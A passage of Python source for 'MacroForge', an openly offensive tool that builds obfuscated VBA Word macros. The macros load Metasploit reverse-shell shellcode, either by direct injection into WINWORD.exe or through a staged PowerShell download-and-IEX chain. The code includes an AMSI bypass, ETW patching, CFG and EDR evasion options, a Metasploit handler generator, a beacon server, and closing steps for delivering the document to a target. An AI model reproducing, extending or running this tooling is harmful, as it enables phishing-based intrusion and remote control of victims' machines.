${V_WC} = New-Object System.Net.WebClient
IEX (${V_WC}.DownloadString(${V_S2URL}))
"""

    # ── Write stage1 to disk (target-side file) ──
    with open(output_path, "w", encoding="ascii", errors="ignore") as f:
        f.write(stage1)

    # ── Write stage2 / stage3 to operator-side staging dir ──
    out_dir = os.path.dirname(os.path.abspath(output_path)) or "."
    s2_path = os.path.join(out_dir, stage2_name)
    s3_path = os.path.join(out_dir, stage3_name)
    with open(s2_path, "w", encoding="ascii", errors="ignore") as f:
        f.write(stage2)
    with open(s3_path, "w", encoding="ascii", errors="ignore") as f:
        f.write(stage3)

    print(f"[+] Stage1 (on disk on target) saved: {output_path}  ({len(stage1)} bytes)")
    print(f"[+] Stage2 (HTTP-only, in-memory)  : {s2_path}  ({len(stage2)} bytes)")
    print(f"[+] Stage3 (HTTP-only, in-memory)  : {s3_path}  ({len(stage3)} bytes)")
    print(f"[+] Shellcode: {len(sc)} bytes (XOR key=0x{sc_key:02x})")


# ─────────────────── Handler RC ───────────────────

def generate_handler_rc(payload_full, lhost, lport, output_path):
    """Generate msfconsole resource file."""
    rc = f"""use exploit/multi/handler
set payload {payload_full}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
    with open(output_path, "w") as f:
        f.write(rc)
    print(f"[+] Handler RC saved: {output_path}")


# ─────────────────── HTTP Server ───────────────────

def start_http_server(directory, port):
    """Start a simple HTTP server in a thread.

    Behavior:
      * /__m/<step>  -> beacon from VBA macro,  responds 200 + empty body
      * /__p/<step>  -> beacon from PS1 stages, responds 200 + empty body
      * other paths  -> normal static-file serving with status code logged
    """

    class MacroForgeHandler(http.server.SimpleHTTPRequestHandler):
        # Tag colors (ANSI). Modern Win10+ cmd handles these natively.
        _C_BEACON_M = "\033[36m"   # cyan  - macro
        _C_BEACON_P = "\033[35m"   # magenta - powershell
        _C_OK       = "\033[32m"   # green
        _C_ERR      = "\033[31m"   # red
        _C_DIM      = "\033[2m"
        _C_RESET    = "\033[0m"

        def __init__(self, *a, **kw):
            super().__init__(*a, directory=directory, **kw)

        # ── beacon detection ───────────────────────────────────────
        def _beacon_kind(self):
            if self.path.startswith("/__m/"):
                return "macro"
            if self.path.startswith("/__p/"):
                return "ps1"
            if self.path.startswith("/__sc/"):
                return "shellcode"
            return None

        # ── GET handler: short-circuit beacons with 200 OK ─────────
        def do_GET(self):
            kind = self._beacon_kind()
            if kind is not None:
                step = self.path.split("/", 3)[-1] or "?"
                try:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", "0")
                    self.send_header("Cache-Control", "no-store")
                    self.end_headers()
                except (BrokenPipeError, ConnectionResetError):
                    pass
                color = self._C_BEACON_M if kind == "macro" else self._C_BEACON_P
                tag   = "BEACON-VBA" if kind == "macro" else "BEACON-PS1"
                if kind == "shellcode":
                    color = "\033[33m"   # yellow
                    tag   = "BEACON-SC"
                print(f"    {color}[{tag}]{self._C_RESET} {step}")
                return
            return super().do_GET()

        # ── HEAD handler: same beacon short-circuit ────────────────
        def do_HEAD(self):
            if self._beacon_kind() is not None:
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            return super().do_HEAD()

        # ── single, clean log line per real request ────────────────
        def log_request(self, code='-', size='-'):
            if self._beacon_kind() is not None:
                # already logged in do_GET; suppress the duplicate
                return
            try:
                code_int = int(code)
            except (TypeError, ValueError):
                code_int = 0
            color = self._C_OK if 200 <= code_int < 400 else self._C_ERR
            print(f"    [HTTP] {color}{code}{self._C_RESET} {self.requestline}")

        # silence the bare "code 404, message Not Found" log_error line
        def log_error(self, *args, **kwargs):
            return

        # silence anything else (date/time, version banner, etc.)
        def log_message(self, format, *args):
            return

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", port), MacroForgeHandler) as httpd:
        print(f"[*] HTTP server listening on 0.0.0.0:{port}  (serving {directory})")
        print( "[*] Beacon legend:")
        print( "      [BEACON-VBA] start            -> AutoOpen entered")
        print( "      [BEACON-VBA] dl_<len>         -> stage1 PS1 downloaded (responseText length)")
        print( "      [BEACON-VBA] save             -> stage1 PS1 written to %TEMP%")
        print( "      [BEACON-VBA] spawn_<pid>      -> powershell.exe spawned (WMI)")
        print( "      [BEACON-VBA] ps_file_present  -> 3s after spawn, .ps1 still in %TEMP%  -> exec-side block (AMSI/AppLocker/CLM)")
        print( "      [BEACON-VBA] ps_file_gone     -> 3s after spawn, .ps1 removed         -> Defender real-time killed it")
        print( "      [BEACON-PS1] loaded     -> stage1 entered")
        print( "      [BEACON-PS1] amsi       -> AMSI bypass executed")
        print( "      [BEACON-PS1] stage2_in  -> stage2 fetched and IEX'd")
        print( "      [BEACON-PS1] addtype    -> Add-Type ran (Win32 P/Invoke loaded)")
        print( "      [BEACON-PS1] etw        -> EtwEventWrite patched")
        print( "      [BEACON-PS1] stage3_in  -> stage3 fetched and IEX'd")
        print( "      [BEACON-PS1] decrypted  -> shellcode XOR-decrypted")
        print( "      [BEACON-PS1] before_exec-> CreateThread about to fire")
        print( "      [BEACON-SC]  alive      -> --test http: shellcode genuinely executed and reached the network")
        httpd.serve_forever()


# ─────────────────── Main ───────────────────

def detect_msf_path():
    """Try to auto-detect Metasploit path."""
    if IS_WINDOWS:
        common_paths = [
            r"E:\metasploit-framework",
            r"D:\metasploit-framework",
            r"C:\metasploit-framework",
            r"C:\Program Files\metasploit-framework",
            r"C:\Program Files (x86)\metasploit-framework",
        ]
    else:
        common_paths = [
            "/usr/share/metasploit-framework",
            "/opt/metasploit-framework",
            os.path.expanduser("~/metasploit-framework"),
            "/usr",  # Kali: msfvenom lives at /usr/bin/msfvenom
        ]
    for p in common_paths:
        if os.path.isdir(p) and find_msfvenom(p):
            return p
    return None


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="MacroForge - Obfuscated VBA Macro Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python MacroForge.py --lhost 10.10.16.7
  python MacroForge.py --lhost 10.10.16.7 --lport 443 --payload reverse_https
  python MacroForge.py --lhost 10.10.16.7 --method xor --serve 8081
  python MacroForge.py --lhost 10.10.16.7 --method base64 --arch x86
""",
    )
    parser.add_argument("--lhost", required=True, help="Your listener IP address")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (default: 4444)")
    parser.add_argument("--http-port", type=int, default=8080, help="HTTP staging port (default: 8080)")
    parser.add_argument("--arch", choices=["x86", "x64"], default="x64", help="Target arch (default: x64)")
    parser.add_argument(
        "--payload",
        choices=list(PAYLOADS.keys()),
        default="reverse_tcp",
        help="Payload type (default: reverse_tcp)",
    )
    parser.add_argument("--msf-path", default=None, help="Path to Metasploit Framework (auto-detect)")
    parser.add_argument("--output-dir", default=".", help="Output directory (default: current)")
    parser.add_argument("--shift", type=int, default=None, help="Encryption key (default: auto per method)")
    parser.add_argument(
        "--method",
        choices=METHODS + ["random"],
        default="random",
        help="Obfuscation method (default: random)",
    )
    parser.add_argument(
        "--mode",
        choices=["shellcode", "staged"],
        default="shellcode",
        help=(
            "Execution mode:\n"
            "  shellcode (default) - VBA injects shellcode directly into WINWORD.exe.\n"
            "                        No powershell.exe, no AMSI for PS, no AppLocker.\n"
            "                        Best vs. modern Defender on OSEP-style targets.\n"
            "  staged              - VBA -> PS1 stage1 -> stage2 -> stage3 -> shellcode.\n"
            "                        Use only if WINWORD.exe injection is blocked\n"
            "                        (e.g. ASR rule 'Block Win32 API calls from Office')."
        ),
    )
    parser.add_argument(
        "--test",
        choices=["calc", "msgbox", "http", "bits"],
        default=None,
        help=(
            "Diagnostic mode (overrides --payload):\n"
            "  calc   - shellcode runs calc.exe via WinExec (no network).\n"
            "  msgbox - shellcode pops a MessageBox and returns (no network).\n"
            "  http   - shellcode does URLDownloadToFile to your --http-port,\n"
            "           proving network egress out of the shellcode itself.\n"
            "           (Goes through urlmon/wininet inside Office process.\n"
            "            Slow: may take 30s-2min via sandbox proxy.)\n"
            "  bits   - shellcode WinExecs `bitsadmin /transfer` to fetch from\n"
            "           your --http-port. The HTTP request comes from the BITS\n"
            "           service (svchost), NOT from WINWORD.exe -> bypasses\n"
            "           any Office-internal API hooks. Use this when --test http\n"
            "           returns no [BEACON-SC] even after waiting."
        ),
    )
    parser.add_argument(
        "--callback",
        choices=["enumwindows", "certenumsystemstore", "enumdateformatsw", "fiber", "random"],
        default="random",
        help=(
            "How to hand control to the shellcode:\n"
            "  enumwindows / certenumsystemstore / enumdateformatsw - classic\n"
            "      callback APIs. Subject to Control Flow Guard (CFG) on\n"
            "      Office 16+ -> WINWORD.exe silently dies before shellcode\n"
            "      runs if CFG bitmap doesn't include the shellcode address.\n"
            "  fiber - CreateFiber + SwitchToFiber. Fiber stack-switch does\n"
            "      NOT go through __guard_check_icall_fptr, so it bypasses\n"
            "      CFG entirely. Use this when callback APIs reach\n"
            "      'invoke_*' beacon but no shellcode network activity\n"
            "      ever follows.\n"
            "  random (default) - picks one of the three callback APIs\n"
            "      (does NOT pick fiber unless you ask explicitly)."
        ),
    )
    parser.add_argument(
        "--encoder",
        default=None,
        help=(
            "msfvenom encoder to scramble the shellcode stub bytes "
            "(e.g. x64/xor_dynamic, x64/zutto_dekiru, x86/shikata_ga_nai).\n"
            "Use when the VBA injection path works (beacons reach invoke_*) "
            "but no session lands -> means EDR is matching the meterpreter\n"
            "stub byte pattern in RX memory. Encoding makes the stub bytes\n"
            "different per build."
        ),
    )
    parser.add_argument(
        "--iterations", type=int, default=1,
        help="Encoder iterations (only used with --encoder). Default 1.",
    )
    parser.add_argument("--serve", nargs="?", const=True, default=False, metavar="PORT", help="Auto-start HTTP server (optional port, e.g. --serve 8081)")
    parser.add_argument("--listen", action="store_true", help="Auto-start msfconsole handler after generation")
    parser.add_argument("--debug", action="store_true", help="Inject HTTP beacons in macro+ps1 to log execution progress (visible in HTTP access log)")

    args = parser.parse_args()

    # ── Handle --serve with optional port ──
    if args.serve is not False:
        if args.serve is not True:
            try:
                args.http_port = int(args.serve)
            except ValueError:
                print(f"[-] ERROR: Invalid port for --serve: {args.serve}")
                sys.exit(1)
        args.serve = True

    # ── Resolve paths ──
    if args.msf_path is None:
        args.msf_path = detect_msf_path()
        if args.msf_path:
            print(f"[*] Auto-detected Metasploit: {args.msf_path}")
        else:
            print("[-] ERROR: Cannot find Metasploit. Use --msf-path.")
            sys.exit(1)

    # ── Resolve method ──
    if args.method == "random":
        args.method = random.choice(METHODS)

    if args.shift is None:
        args.shift = default_key(args.method)

    payload_full = PAYLOADS[args.payload][args.arch]
    output_dir = os.path.abspath(args.output_dir)
    os.makedirs(output_dir, exist_ok=True)

    # ── Refuse to let msf handler and beacon HTTP server collide on the
    #    same port. Without this guard, msf silently fails to bind and the
    #    user wonders why beacons work but no session ever lands. ──
    if args.serve and args.http_port == args.lport:
        # Pick first free port >= 9999, away from the lport.
        for candidate in (9999, 9998, 9997, 9996, 8000, 8001, 8002):
            if candidate != args.lport:
                args.http_port = candidate
                break
        print(f"[!] --http-port collides with --lport ({args.lport}); "
              f"moving beacon HTTP server to {args.http_port}.")
        print(f"    msf handler keeps {args.lport}.")

    vba_path = os.path.join(output_dir, "macro.vba")
    rc_path  = os.path.join(output_dir, "handler.rc")

    print(f"[*] Mode: {args.mode}")
    print(f"[*] Config: {args.lhost}:{args.lport} | {payload_full} | method={args.method} key={args.shift}")
    print("=" * 60)

    if args.mode == "shellcode":
        # ── Direct in-process shellcode injection (no PS1) ──
        print("\n[*] Step 1: Generating shellcode via msfvenom...")
        if args.test == "calc":
            test_payload = f"windows/{'x64/' if args.arch == 'x64' else ''}exec"
            print(f"[!] DIAGNOSTIC MODE: payload = {test_payload}  CMD=calc.exe")
            print( "    If calc pops on the target, shellcode execution works ->")
            print( "    your meterpreter problem is network/EDR-on-network.")
            print( "    If calc does NOT pop, shellcode is being blocked in memory.")
            sc = run_msfvenom_raw(args.msf_path, test_payload, args.lhost, args.lport,
                                  output_dir, extra_args=["CMD=calc.exe", "EXITFUNC=thread"])
        elif args.test == "msgbox":
            test_payload = f"windows/{'x64/' if args.arch == 'x64' else ''}messagebox"
            print(f"[!] DIAGNOSTIC MODE: payload = {test_payload}")
            sc = run_msfvenom_raw(args.msf_path, test_payload, args.lhost, args.lport,
                                  output_dir, extra_args=["TEXT=MacroForge OK", "EXITFUNC=thread"])
        elif args.test == "http":
            # download_exec uses URLDownloadToFileA from urlmon.dll. The download
            # itself is the diagnostic: if the request shows up in the beacon
            # HTTP server log, the shellcode genuinely executed and made an
            # outbound network call from inside WINWORD.exe -- which means any
            # subsequent meterpreter failure is purely about meterpreter
            # protocol/byte-pattern detection, not about shellcode execution
            # or general egress.
            test_payload = f"windows/{'x64/' if args.arch == 'x64' else ''}download_exec"
            test_url = f"http://{args.lhost}:{args.http_port}/__sc/alive"
            print(f"[!] DIAGNOSTIC MODE: payload = {test_payload}")
            print(f"    Shellcode will URLDownloadToFile from: {test_url}")
            print(f"    Watch the beacon HTTP server log for a GET to /__sc/alive .")
            print(f"    If you see it, the shellcode is alive and has network egress.")
            sc = run_msfvenom_raw(args.msf_path, test_payload, args.lhost, args.lport,
                                  output_dir,
                                  extra_args=[f"URL={test_url}", "EXITFUNC=thread"],
                                  encoder=args.encoder, iterations=args.iterations)
        elif args.test == "bits":
            # WinExec bitsadmin to do the actual fetch. The network request
            # is made by svchost (BITS service), NOT by WINWORD.exe. So if
            # this beacon arrives, shellcode definitely executed -- even if
            # all of Office's wininet/urlmon hooks would have blocked --test http.
            test_payload = f"windows/{'x64/' if args.arch == 'x64' else ''}exec"
            test_url = f"http://{args.lhost}:{args.http_port}/__sc/bits_alive"
            cmd_str = (
                f'cmd.exe /c bitsadmin /transfer j /priority foreground '
                f'{test_url} %TEMP%\\\\b.txt'
            )
            print(f"[!] DIAGNOSTIC MODE: payload = {test_payload} CMD={cmd_str}")
            print(f"    Shellcode WinExecs bitsadmin -> BITS service GETs: {test_url}")
            print(f"    Watch the beacon HTTP server for /__sc/bits_alive .")
            print(f"    BITS is a separate svchost process so this dodges in-Office hooks.")
            sc = run_msfvenom_raw(args.msf_path, test_payload, args.lhost, args.lport,
                                  output_dir,
                                  extra_args=[f"CMD={cmd_str}", "EXITFUNC=thread"],
                                  encoder=args.encoder, iterations=args.iterations)
        else:
            sc = run_msfvenom_raw(args.msf_path, payload_full, args.lhost, args.lport,
                                  output_dir, encoder=args.encoder, iterations=args.iterations)
        print(f"[+] Shellcode: {len(sc)} bytes")

        print("\n[*] Step 2: Generating self-contained VBA injector...")
        forced_cb = None if args.callback == "random" else args.callback
        vba_code = generate_vba_shellcode(sc, args.lhost, args.http_port,
                                          debug=args.debug, force_callback=forced_cb)
        with open(vba_path, "w") as f:
            f.write(vba_code)
        print(f"[+] VBA macro saved: {vba_path}")
        if args.debug:
            print(f"    [debug] beacons enabled -> http://{args.lhost}:{args.http_port}/__m/<step>")

        stage_filename = None  # not used in shellcode mode

    else:
        # ── Legacy 3-stage PS1 path ──
        stage_filename = random_name(6) + ".ps1"
        ps1_path = os.path.join(output_dir, stage_filename)

        print("\n[*] Step 1: Generating obfuscated VBA macro...")
        vba_code = generate_vba(args.lhost, args.http_port, args.method, args.shift, stage_filename, debug=args.debug)
        with open(vba_path, "w") as f:
            f.write(vba_code)
        print(f"[+] VBA macro saved: {vba_path}")
        if args.debug:
            print(f"    [debug] beacons enabled -> http://{args.lhost}:{args.http_port}/__m/<step>")

        print("\n[*] Step 2: Generating PowerShell payload...")
        generate_ps1(args.msf_path, payload_full, args.lhost, args.lport, args.http_port, ps1_path, debug=args.debug)
        if args.debug:
            print(f"    [debug] beacons enabled -> http://{args.lhost}:{args.http_port}/__p/<step>")

    # ── Step 3: Generate handler RC ──
    print("\n[*] Step 3: Generating handler resource file...")
    generate_handler_rc(payload_full, args.lhost, args.lport, rc_path)

    # ── Summary ──
    msfconsole = find_msfconsole(args.msf_path) or "msfconsole"
    if args.mode == "shellcode":
        files_block = "  macro.vba        -> Paste into Word VBA Module (self-contained, no HTTP needed)"
        usage_http = "  1) (Optional) Start HTTP server only if --debug beacons enabled:\n     cd " + output_dir + "\n     python -m http.server " + str(args.http_port) + "\n"
    else:
        files_block = (
            "  macro.vba        -> Paste into Word VBA Module\n"
            f"  {stage_filename}  -> Hosted on HTTP server (auto-downloaded by macro)"
        )
        usage_http = "  1) Start HTTP server (REQUIRED for staged mode):\n     cd " + output_dir + "\n     python -m http.server " + str(args.http_port) + "\n"

    print(f"""
{'=' * 60}
[+] ALL FILES GENERATED SUCCESSFULLY
{'=' * 60}

{files_block}
  handler.rc       -> Metasploit handler config

=== Usage ===

{usage_http}
  2) Start Metasploit handler:
     {msfconsole} -r "{rc_path}"

  3) Create Word document:
     - New Word doc -> Alt+F11 -> Insert Module
     - Paste macro.vba contents
     - Save as .doc or .docm

  4) Deliver document to target

{'=' * 60}
  MODE:     {args.mode}
  LHOST:    {args.lhost}
  LPORT:    {args.lport}
  HTTP:     :{args.http_port}
  ARCH:     {args.arch}
  PAYLOAD:  {payload_full}
  METHOD:   {args.method}
  KEY:      {args.shift}
{'=' * 60}
""")

    # ── Auto-serve ──
    # Shellcode mode: HTTP server only useful for --debug beacons.
    # Staged mode: HTTP server is REQUIRED to host the stage1/stage2/stage3.
    needs_server = (args.mode == "staged") or args.debug

    # ── Pre-flight: confirm both ports are free BEFORE we spawn anything.
    #    msf is forked-detached so a bind failure on its side is silent;
    #    catching it here prevents the "beacons work, no session ever lands"
    #    rabbit hole. ──
    def _port_free(port):
        import socket as _s
        try:
            with _s.socket(_s.AF_INET, _s.SOCK_STREAM) as s:
                s.setsockopt(_s.SOL_SOCKET, _s.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
            return True
        except OSError:
            return False

    if args.listen and not _port_free(args.lport):
        print(f"[-] ERROR: port {args.lport} (msf handler) is already in use.")
        print(f"    Free it first (lsof -iTCP:{args.lport} -sTCP:LISTEN), or pick another --lport.")
        sys.exit(1)
    if args.serve and needs_server and not _port_free(args.http_port):
        print(f"[-] ERROR: port {args.http_port} (beacon HTTP) is already in use.")
        print(f"    Free it first or pick another --http-port.")
        sys.exit(1)

    # ── Always start msfconsole FIRST so it claims its port before our
    #    Python HTTP server. Otherwise a port collision (e.g. user passes
    #    --lport == --http-port) silently strands msf. ──
    def _spawn_msf():
        print(f"[*] Starting msfconsole handler on :{args.lport}...")
        if IS_WINDOWS:
            subprocess.Popen([msfconsole, "-r", rc_path],
                             creationflags=subprocess.CREATE_NEW_CONSOLE)
        else:
            subprocess.Popen([msfconsole, "-r", rc_path])

    def _spawn_http():
        print(f"[*] Starting beacon HTTP server on :{args.http_port}...")
        t = threading.Thread(target=start_http_server,
                             args=(output_dir, args.http_port), daemon=True)
        t.start()

    if args.listen:
        _spawn_msf()
        # Give msf a head start to bind its port before we open ours.
        time.sleep(2)

    if args.serve:
        if needs_server:
            _spawn_http()
        else:
            print("[*] --serve ignored in shellcode mode without --debug (no HTTP needed).")

    if args.listen or (args.serve and needs_server):
        print("[*] Press Ctrl+C to stop.\n")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")


if __name__ == "__main__":
    main()
